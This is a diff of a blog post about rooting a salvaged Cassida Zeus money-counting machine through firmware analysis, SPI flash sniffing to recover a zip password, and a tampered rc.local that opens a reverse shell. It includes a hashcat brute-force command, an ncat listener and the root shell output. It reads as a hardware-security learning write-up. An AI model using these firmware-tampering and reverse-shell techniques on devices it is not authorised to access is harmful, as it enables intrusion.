@@ -10,10 +10,10 @@ tags:
 > Note: The actions in this post have taken place somewhere in 2022 and a step in the process leveraged an oversight in the _Cassida Pro_ website which has since been fixed.
 
 ## Introduction
-This post will walk through the steps in hacking an embedded machine from A to Z, with any and all pitfalls that crossed my path. If you think I made a mistake or could've taken an easier route, please let me know and I will add it to the post.
+This post will walk through the steps of hacking an embedded machine from A to Z in a nondestructive way, with any and all pitfalls that crossed my path. If you think I made a mistake or could've taken an easier route, please let me know and I will add it to the post.
 
 ## Background
-As a supervisor at [Makerspace Delft](https://www.makerspacedelft.nl/), I often got my hands on some high end trash. It's located on the south side of Delft in an abandoned cable factory[^2] which has been repurposed for hobbyists and startups, although they want to [revamp the entire place in the near future and turn it into a mixed purpose district](https://kabeldistrict.nl/) which makes the future for these kinds of businesses uncertain. Anyhow, I will agree that the place is in need of a cleanup but its shadyness probably led into the creation of this post.
+As a (former) supervisor at [Makerspace Delft](https://www.makerspacedelft.nl/), I often got my hands on some high end trash. It's located on the south side of Delft in an abandoned cable factory[^2] which has been repurposed for hobbyists and startups, although they want to [revamp the entire place in the near future and turn it into a mixed purpose district](https://kabeldistrict.nl/) which makes the future for these kinds of businesses uncertain. Anyhow, I will agree that the place is in need of a cleanup but its shadyness probably kickstarted the creation of this post.
 
 Anyone who's been to the Netherlands knows that cash is rarely used nowadays, except by the elderly and drug dealers. While I don't want to point fingers at who this money counting machine may have belonged to, the fact that it was found closely following a drug bust in a run down factory may give some slight hints. I'll leave the connecting of the dots as an exercise to the reader. 
 
@@ -27,25 +27,34 @@ When plugging it in, it looked good to go, the screen lit up and everything. Bet
 
 I opted to take the machine and try to hack into it, it was my first time trying something like this but seemed like a fun challenge.
 
-[^3]: Which shows the usefulness of such a machine here
+[^3]: Which shows the usefulness of such a machine in the Netherlands
 
 ## Examining the machine
 ![Cassida Zeus](cassida/zeus.PNG)
 
 **So yeah, where do we even start?**  
-What I did at first was look around the machine and see what capabilities it had. To get started I looked for a [service manual](https://manualzz.com/doc/65915383/cassida-pro-series-service-manual), and came across one that suited my needs, [^4] I highly recommend skimming over the document to understand this post better.
-
-[^4]: This isn't the exact service manual I initially found, so keen observers might see a glimpse of the _"secret"_ test menu. I will get to my discovery of this document later.
+What I did at first was look around the machine and see what capabilities it had. To get started I looked for a [service manual](https://manualzz.com/doc/65915383/cassida-pro-series-service-manual), and came across one that suited my needs. Unfortunately this isn't the exact service manual I initially found, so keen observers might see a glimpse of the _"secret"_ test menu. I will get to my discovery of this document later.
 
 ![Cassida Zeus Backside](cassida/backside2.PNG)
 
-Ah, _interesting_, the USB-B port can be used for a connection to the PC, but reading on we find that we need a specific API for communication, and while trying around in [PuTTy](https://www.putty.org/) and enumerating baud rates, I found no way of getting a response of the machine so gave up. 
+Ah, _interesting_, the USB-B port can be used for a connection to the PC, but reading on we find that we need a specific API for communication. Unfortunately when trying around in [PuTTy](https://www.putty.org/) while enumerating baud rates, I found no way of getting a response of the machine so gave up. 
 
 ![Proprietary API](cassida/usb_connection.PNG)
 
 Based on some poking and interfacing with some of the ports, I got none the wiser and opted to open up the machine and see whats inside.
 
+### Taking a look inside
 
+Opening it up, we can reveal a couple more interesting things. The first thing I noticed was a couple of unused ports not accessible from the outside, as well as a micro sd card slot.
+
+And most importantly, a 4 pin header labeled `Debugging` which is probably a UART connection. 
+|Ports|Hidden SD Card Slot|Debugging slot|
+|-|-|-|
+|![Ports](cassida/findings1.png)|![SD Card](cassida/findings2.png)|![Debugging](cassida/findings3.png)|
+
+So lets just attach some wires and talk to it through PuTTy. I iterated baud rates but even with an oscilloscope I couldn't see any response. So I gave up on this approach as well.
+
+![Lets chat](cassida/lets_chat.jpg)
 
 ## Looking for more information
 Well, that brought us nowhere, so let's look for some more information. The machine has a model number, so let's look that up. The first result is the [Cassida Pro](https://cassidapro.com/) website, which is the company that makes the machine. 
@@ -66,7 +75,7 @@ Well, there we go, a page with a bunch of links to manuals and firmware updates.
 
 ![Get thwarted nerd](cassida/too_easy2.png)
 
-Darn, it seemed too easy anyway. I'm glad to see _Mike Bodine_ is on top of his game, completely thwarting any attempts to get some firmware updates.
+Darn, it seemed too easy anyway. I'm glad to see _"Mike Bodine"_ is on top of his game, completely thwarting any attempts to get some firmware updates.
 
 #### "The Spanish Strategy"™
 
@@ -126,22 +135,22 @@ Then we just run hashcat with a simple bruteforce attack, as we don't know anyth
 $ hashcat -m 17225 only_hash.hash -a 3 ?a?a?a?a?a?a?a?a?a?a ‐‐increment
 ```
 
-After a couple of days, I only managed to get up to 8 characters[^22]. Not knowing anything about the length of the password, I decided to give up on this approach.
+After a couple of hours, I only managed to get up to 8 characters[^22]. Not knowing anything about the length of the password, I decided to give up on this approach.
 
 
-[^21]: Adapted from [https://ctftime.org/writeup/28193](https://ctftime.org/writeup/28193)
-[^22]: Maybe consider updating password policies to go beyond 8 characters...
+[^21]: Adapted from [https://ctftime.org/writeup/28193](https://ctftime.org/writeup/28193), the hash used is theirs.
+[^22]: In hindsight, leaving it for a couple hours longer would've broken it.
 
 ### Exploiting weak zip encryption
 
-Looking back at the image we see that the files are encrypted with ZipCrypto which is a legacy cryptography algorithm vulnerable to [a partial known plaintext attack](https://link.springer.com/chapter/10.1007/3-540-60590-8_12), and a tool called [bkcrack](https://github.com/kimci86/bkcrack) to exploit this[^23]. The tool requires 12 bytes of known plaintext, which we may be able to find in the firmware update. 
+Looking back at the image we see that the files are encrypted with ZipCrypto which is a legacy cryptography algorithm vulnerable to [a partial known plaintext attack](https://link.springer.com/chapter/10.1007/3-540-60590-8_12). Luckily a tool called [bkcrack](https://github.com/kimci86/bkcrack) can already exploit this[^23]. The tool requires 12 bytes of known plaintext, which we may be able to find in the firmware update. 
 
-Unfortunately, none of the files in there were findable on google, so we don't have a complete plaintext to use for the decryption script. However we can guess that the first 12 bytes of the `rc.local` file are likely `#!/bin/sh\n`:
+Unfortunately, none of the files in there were findable on google, so we don't have a complete plaintext to use for the attack. However we can guess that the first 12 bytes of the `rc.local` file are likely `#!/bin/sh\n`:
 |1|2|3|4|5|6|7|8|9|10|11|12|
 |-|-|-|-|-|-|-|-|-|-|-|-|
 |`#`|`!`|`/`|`b`|`i`|`n`|`/`|`s`|`h`|`\n`|`?`|`?`|
 
-Which leaves us with 2 character to bruteforce but we can guess that it very likely might be `#` and `\n` or ` `. However, I got stopped right in my tracks when I looked back at the 7zip window and saw that the `rc.local` file wasn't just encrypted, it was also compressed with the DEFLATE algorithm.
+Which leaves us with 2 character to bruteforce but we can guess that it very likely might be `#` and `\n` or a spacenar. However, I got stopped right in my tracks when I looked back at the 7zip window and saw that the `rc.local` file wasn't just encrypted, it was also compressed with the DEFLATE algorithm.
 
 So the "plaintext" that got encrypted isn't actually the plaintext, but the compressed plaintext. I don't know how deflate works but since the initial approach already relied on guessing 2 bytes out of 12, trying to guess it after it's been compressed is probably not going to work. So I gave up on this approach as well.
 
@@ -160,17 +169,17 @@ Through the pigeonhole principle we can see that there are multiple 3 letter str
 
 ![matches](cassida/calc.png)
 
-... a bit too many matches, and this is just for a guess that the file is a list of 3 letter currency codes in that exact format, maybe it uses square brackets, or spaces instead of commas, maybe a different capitalization even. Not even mentioning the fact that after a match we need to brute force different settings for the deflate algorithm. And then use the time-intensive decryption script to see if it's the right one. So I gave up on this approach as well.
+... a bit too many matches, and this is just for a guess that the file is a list of 3 letter currency codes in that exact format, maybe it uses regular brackets, or spaces instead of commas, maybe a different capitalization even. Not even mentioning the fact that after a match we need to brute force different settings for the deflate algorithm. And then use the time-intensive decryption script to see if it's the right one. So I gave up on this approach as well.
 
 (Fun fact, the actual file is just some ascii numbers with some whitespace sprinkled in, so it's not even a list of currencies)
 
 [^24]: Based on [this list.](https://www.eurochange.co.uk/travel/tips/world-currency-abbreviations-symbols-and-codes-travel-money)
 ## Finding the key
-Well, the firmware has to be decrypted somewhere. Unfortunately that place is in the machine itself, so we have to find a way to read it out. Let's start by looking at the board again and looking for some interesting chips.
+Well, the firmware update file has to be decrypted somewhere right? Unfortunately that place is in the machine itself, so we have to find a way to read it out. Let's start by looking at the board again and looking for some interesting chips.
 
 ### Where is it?
 ![Cassida Zeus Board](cassida/back_of_the_board.jpg)
-Flipping over the board reveals a bunch of additional chips, and we can see a familiar sight. We can make an educated guess that the large black chip in the middle is the CPU and the two smaller chips to the left are the RAM chips. However the last chip is what we are looking for, the [W25Q256JVFQ](https://www.winbond.com/hq/product/code-storage-flash-memory/serial-nor-flash/?__locale%253Den%2526partNo%253DW25Q256JV) flash chip [^5]. We can follow the standard flash memory naming convention to figure out that this is a 256Mbit flash chip, which is 32MB of storage.
+Flipping over the board reveals a bunch of additional chips, and we can see a familiar sight. We can make an educated guess that the large black chip in the middle is the CPU and the two smaller chips to the left are the RAM chips. However the last chip is what we are looking for, the [W25Q256JVFQ](https://www.winbond.com/hq/product/code-storage-flash-memory/serial-nor-flash/?__locale%253Den%2526partNo%253DW25Q256JV) flash chip. [^5] We can follow the standard flash memory naming convention to figure out that this is a 256Mbit flash chip, which means it has 32MB of storage.
 
 [^5]: ![25Q256JVFQ](cassida/zoomedin.jpg)
 
@@ -199,7 +208,7 @@ I used a [SPIDriver](https://spidriver.com/)[^8] to connect to the chip, but any
 
 ![SPIDriver connected to the flash chip](cassida/SPIDriver.PNG)
 
-Let's get cooking and send a [simple request](https://spidriver.readthedocs.io/en/latest/index.html) to read the ID of the chip:
+Let's get cooking and send the ["Quick start"](https://spidriver.readthedocs.io/en/latest/index.html) request to read the ID of the chip:
 [^8]: ![SPIDriver image](https://spidriver.com/images/spidriver-main@1x.jpg)
 
 ```python
@@ -211,7 +220,7 @@ for _ in range(3):
     print(list(s.read(3))) # read next 3 bytes
     s.unsel()
 ```
-We expect to get the the ID of the chip three times, so what do we get?
+We expect to get the the same ID of the chip three times, so what do we get?
 
 ```python
 [0x43, 0x2e, 0x89]
@@ -219,21 +228,21 @@ We expect to get the the ID of the chip three times, so what do we get?
 [0x88, 0x4e, 0x90]
 ```
 
-Hmmmmmm.... That's really strange. The likely explanation is that this technique can be noisy because the chip is still attached to the PCB, this means that **our SPIDriver is also powering the rest of the board**, so we are talking to the chip at the same time as the CPU is. This means that we are getting some garbage data back. 
+Hmmmmmm.... That's really strange. The likely explanation is that this technique doesn't work because the chip is still attached to the PCB, this means that **our SPIDriver is also powering the rest of the board**, so we are talking to the chip at the same time as the CPU is. This means that we are getting some garbage data back. 
 - A possible fix for this is pulling the reset pin of the CPU low, which should stop it from interfering with our communication. However, as someone who is terrible at soldering, lets not even attempt to deal with the even smaller pins on the CPU.
 - Another probably even smarter fix in hindsight is to just wait for the CPU to boot up and then read the flash chip and go to idle, and then talk during the downtime. However, I didn't think of this at the time. 
 
 ### Eavesdropping
 
-Lets use the lesson learned from trying to talk to it directly and try to eavesdrop on the communication between the CPU and the flash chip. We we're already accidentally doing that anyway. To do this we keep the same setup as before and switch out the SPIDriver for a [logic analyzer](https://nl.aliexpress.com/item/1005005357814678.html?spm%253Da2g0o.productlist.main.13.4b263dceNws6U4%2526algo_pvid%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc%2526aem_p4p_detail%253D202307020817102827198594201600011524413%2526algo_exp_id%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc-6%2526pdp_npi%253D3%2540dis%2521EUR%25216.08%25215.47%2521%2521%2521%2521%2521%254021021aa216883110301477062d0753%252112000032732028934%2521sea%2521NL%25211866391656%2526curPageLogUid%253D4AQ4Y776oOl0%2526search_p4p_id%253D202307020817102827198594201600011524413_7)[^9]. This allows us to see the communication between the CPU and the flash chip. We also switch from a python script to [PulseView](https://sigrok.org/wiki/PulseView), which is a tool for analyzing logic analyzer data. Also I needed the board to boot normally, so I had to attack all the wires back to the board and then boot. This is what the setup looks like:
+Lets use the lesson learned from trying to talk to it directly and try to eavesdrop on the communication between the CPU and the flash chip. We we're already accidentally doing that anyway. To do this we keep the same setup as before and switch out the SPIDriver for a [logic analyzer](https://nl.aliexpress.com/item/1005005357814678.html?spm%253Da2g0o.productlist.main.13.4b263dceNws6U4%2526algo_pvid%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc%2526aem_p4p_detail%253D202307020817102827198594201600011524413%2526algo_exp_id%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc-6%2526pdp_npi%253D3%2540dis%2521EUR%25216.08%25215.47%2521%2521%2521%2521%2521%254021021aa216883110301477062d0753%252112000032732028934%2521sea%2521NL%25211866391656%2526curPageLogUid%253D4AQ4Y776oOl0%2526search_p4p_id%253D202307020817102827198594201600011524413_7).[^9] This allows us to see the communication between the CPU and the flash chip. We also switch from a python script to [PulseView](https://sigrok.org/wiki/PulseView), which is a tool for analyzing logic analyzer data. Also I needed the board to boot normally, so I had to attack all the wires back to the board and then boot. This is what the setup looks like:
 
 ![Logic analyzer v1 setup](cassida/ShitSetup.PNG)
 
 ![Output v1](cassida/logic_analyzer_output.PNG)
 
-We're reading some bits going up and down, so that's good. But it looks a bit scrambled. We're **expecting a clear clock signal** to delineate the bytes[^10], but we are seeing no such thing. We see a regular-ish pattern on the 4th channel but it's switching slower than the clock speed we expect. My hypothesis was that we are sampling too slow, which is why we are getting a mangled clock speed. There's probably some very clever math to figure out what the real clock speed is, but I'm not that clever. So I just tried to sample faster.
+We're reading some bits going up and down, so that's good. But it looks a bit scrambled. We're **expecting a clear clock signal** to delineate the bytes,[^10] but we are seeing no such thing. We see a regular-ish pattern on the 4th channel but it's switching slower than the clock speed we expect. My hypothesis was that we are sampling too slow, which is why we are getting a mangled clock speed. There's probably some very clever math to figure out what the real clock speed is, but I'm not that clever. So I just tried to sample faster.
 
-The logic analyzer I have can sample at 24MHz, which is a lot lower than the maximal rate of 133MHz the chip supports. So I had to put up some money and buy a better logic analyzer. I bought a [Kingst LA1010](https://nl.aliexpress.com/item/1005004678997124.html?spm%253Da2g0o.productlist.main.19.4b263dceNws6U4%2526algo_pvid%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc%2526algo_exp_id%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc-9%2526pdp_npi%253D3%2540dis%2521EUR%2521109.73%252165.84%2521%2521%2521%2521%2521%254021021aa216883110301477062d0753%252112000030072936740%2521sea%2521NL%25211866391656%2526curPageLogUid%253D3s2ldTngXZjk)[^11], which can sample at 100MHz (at 3 channels, but we just sample DI, DO and CLK), and also switched to [KingstVIS](http://www.qdkingst.com/en)[^12]. This is what the setup looks like now:
+The logic analyzer I have can sample at 24MHz, which is a lot lower than the maximal rate of 133MHz the chip supports. So I had to put up some money and buy a better logic analyzer. I bought a [Kingst LA1010](https://nl.aliexpress.com/item/1005004678997124.html?spm%253Da2g0o.productlist.main.19.4b263dceNws6U4%2526algo_pvid%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc%2526algo_exp_id%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc-9%2526pdp_npi%253D3%2540dis%2521EUR%2521109.73%252165.84%2521%2521%2521%2521%2521%254021021aa216883110301477062d0753%252112000030072936740%2521sea%2521NL%25211866391656%2526curPageLogUid%253D3s2ldTngXZjk),[^11] which can sample at 100MHz (at 3 channels, but we just sample DI, DO and CLK), and also switched to [KingstVIS](http://www.qdkingst.com/en)[^12]. This is what the setup looks like now:
 
 ![Logic analyzer v2 setup](cassida/setup2.PNG)
 
@@ -248,7 +257,7 @@ Now that looks amazing!
 
 ### Reconstructing the flash chip
 
-Now that we have a captured SPI conversation from boot all the way to the _firmware update_ menu, the encryption key may have been copied from the flash chip to the CPU. So we simply take all bytes that the flash chip has sent to the CPU and concatenate them together and save it to a file. I wrote a simple parser that used an exported csv from KingstVIS and only looked at the DO line. Unfortunately that script is lost to time. Lets call this file `result.bin`.
+Now that we have a captured SPI conversation from boot all the way to the _firmware update_ menu, the encryption key probably has been copied from the flash chip to the CPU at some point. So we simply take all bytes that the flash chip has sent to the CPU and concatenate them together and save it to a file. I wrote a simple parser that used an exported csv from KingstVIS and only looked at the DO line. Unfortunately that script is lost to time. Lets call this file `result.bin`.
 
 ![Some present strings](cassida/results.PNG)
 
@@ -256,7 +265,7 @@ And we can already see some interesting stuff. How about we do something simple 
 
 ![Zip string](cassida/password.PNG)
 
-And there we are, the password falls right into our lap. The `-P` argument to `unzip` takes in a flag and we can now just read it. [^13]
+And there we are, the password falls right into our lap. The `-P` argument to `unzip` takes in the decryption password and we can now just read it out and use it. [^13]
 
 [^13]: For obvious reasons I'm not going to post the password here.
 
@@ -292,7 +301,7 @@ fi
 
 ```
 
-While this looked a bit too easy to be true, I just added a line to the end of the file: [^15]
+While this looked a bit too easy to be true, I just added a couple of lines to the end of the file: [^15]
 ```bash
 sleep 60
 
@@ -302,7 +311,7 @@ The sleep was added since the network driver needed some time to start up.
 
 ### Putting it all together
 
-So now we save the modified firmware file and zip it back up together using the password we found earlier and rename it to a `.tbk` file. Then I just put it on a USB stick and plugged it into the machine. I then went to the _firmware update_ menu and selected the file. I started up a simple listener on my host with `ncat -nvlp 4444`. The machine then rebooted and I waited for a minute. Then after realizing that a minute takes way more time when anticipating an uncertain outcome something showed up on my screen:
+So now we save the modified firmware file and zip it back up together using the password we found earlier and rename it to a `.tbk` file. Then I just put it on a USB stick and plugged it into the machine. I then went to the _firmware update_ menu and selected the file. I started up a simple listener on my host with `ncat -nvlp 4444`. After updating the machine then rebooted, which triggered the execution of my modified `rc.local` file. I then waited patiently. After realizing that a minute feels really long when anticipating an uncertain outcome something popped up on my listener:
 
 ![Shell](cassida/gotem.PNG)
 
@@ -310,8 +319,34 @@ So now we save the modified firmware file and zip it back up together using the 
 [^14]: [https://linuxhint.com/use-etc-rc-local-boot/](https://linuxhint.com/use-etc-rc-local-boot/)
 [^15]: I initally tested netcat reverse shells as well, but it was dumb to assume that netcat would be installed on the device. So a shell that uses the built-in `sh` shell makes more sense.
 
-> Specs of the machine:
+#### Some specs:
+```bash
+sh-2.05b# whoami
+root
+sh-2.05b# hostname
+ZEUS
+sh-2.05b# uname -a
+Linux ZEUS 3.0.101-2790-gc248ed7 #1 PREEMPT Thu Sep 17 13:16:53 KST 2015 armv7l GNU/Linux
+sh-2.05b# df -h
+Filesystem                Size      Used Available Use% Mounted on
+ubi0:rootfs              23.3M     18.9M      4.4M  81% /
+tmpfs                   251.2M     52.0K    251.2M   0% /dev
+shm                     251.2M         0    251.2M   0% /dev/shm
+rwfs                      3.0M    668.0K      2.3M  22% /mnt/rwfs
+rwfs                      3.0M    668.0K      2.3M  22% /tmp
+rwfs                      3.0M    668.0K      2.3M  22% /var
+/dev/host_udisk1          3.7G     12.3M      3.7G   0% /mnt/usb
+sh-2.05b# busybox
+BusyBox v1.20.2 () multi-call binary.
+...
+```
 
 ## Conclusion
 
-## Summary
+{{< video src="/cassida/takehomemessage.mp4" type="video/webm" preload="auto" >}}
+
+## Future work
+
+This was a fun project, but only exposes an exploit that requires hands on access to the machine. It would be interesting to see if we can find a way to exploit the machine remotely. We'd need to reverse engineer the running programs and see if we can find any vulnerabilities in them.
+
+I'm currently not planning on doing this, but if you want to take a stab at it, feel free to contact me and I'll give you some information on how to get started.
